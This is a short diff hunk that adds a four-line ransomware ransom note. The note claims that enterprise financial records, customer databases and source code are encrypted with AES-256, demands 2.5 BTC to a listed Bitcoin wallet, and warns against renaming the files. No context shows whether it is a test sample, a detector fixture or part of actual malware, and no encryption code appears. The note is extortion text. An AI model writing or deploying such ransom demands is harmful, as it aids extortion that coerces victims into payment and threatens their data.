@@ -1,0 +1,4 @@
+!!! YOUR ENTERPRISE FILES HAVE BEEN ENCRYPTED WITH AES-256 !!!
+All your financial records, customer databases, and source code are locked.
+Send 2.5 BTC to wallet 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa to receive decryption key.
+Do not modify or rename encrypted files.
